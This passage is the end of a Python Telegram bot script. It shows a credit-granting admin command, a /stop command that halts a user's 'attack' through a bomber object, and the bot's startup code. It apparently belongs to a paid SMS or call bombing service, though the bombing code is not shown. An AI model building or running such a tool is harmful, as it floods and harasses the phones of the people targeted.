            await upd.message.reply_text(f"{bold('✅ CREATED NEW USER AND ADDED')} {cred} {bold('CREDITS TO')} {uid}")
        else:
            await upd.message.reply_text(f"{bold('✅ ADDED')} {cred} {bold('CREDITS TO')} {uid}")
        
        try:
            await ctx.bot.send_message(uid, f"{bold('✅ ADMIN ADDED')} {cred} {bold('CREDITS TO YOUR ACCOUNT!')}")
        except:
            pass
    except ValueError:
        await upd.message.reply_text(f"{bold('❌ INVALID USER ID OR CREDITS')}")
    except Exception as e:
        await upd.message.reply_text(f"{bold('❌ ERROR')}: {str(e)}")

async def stop_cmd(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = upd.effective_user.id
    stopped = await bomber.stop(uid)
    if stopped:
        await upd.message.reply_text(f"{bold('✅ ATTACK STOPPED')}", reply_markup=back_btn())
    else:
        await upd.message.reply_text(f"{bold('❌ NO ACTIVE ATTACK')}", reply_markup=back_btn())

# ==================== MAIN ====================
async def main():
    print(f"{Fore.RED}╔{'═'*50}╗{Style.RESET_ALL}")
    print(f"{Fore.RED}║{' '*15}ASIF PREMIUM BOT{' '*15}║{Style.RESET_ALL}")
    print(f"{Fore.RED}╚{'═'*50}╝{Style.RESET_ALL}")
    
    # FIXED: Increased timeout values
    app = Application.builder().token(BOT_TOKEN).connect_timeout(30).read_timeout(30).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add", add_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CallbackQueryHandler(callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(MessageHandler(filters.PHOTO, handle_msg))
    
    print(f"{Fore.GREEN}✅ BOT RUNNING{Style.RESET_ALL}")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}🛑 STOPPED{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ FATAL ERROR: {e}{Style.RESET_ALL}")